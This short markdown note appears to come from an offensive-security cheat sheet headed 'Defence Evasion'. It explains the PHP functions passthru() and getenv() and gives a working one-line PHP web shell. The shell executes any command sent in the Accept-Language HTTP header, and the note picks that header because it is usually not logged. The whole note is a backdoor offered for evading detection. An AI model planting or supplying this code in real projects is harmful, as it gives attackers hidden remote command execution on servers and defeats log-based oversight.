## DEFENCE EVASION
`passthru()` = executes an external program and display the raw output

this php function can be used to execute commands via an http header which is not logged most often ,
`ACCEPT-LANGUAGE`  is the header which is not logged 
`getenv()` = get the value of environment variable 

```php
<?php passthru(getenv('HTTP_ACCEPT_LANGUAGE')); ?>
```

ITS A WEBSHELL , WHERE THE COMMAND WILL BE PASSED ON `HTTP_ACCEPT_LANGUAGE` HEADER , WHICH IS NOT LOGGED 

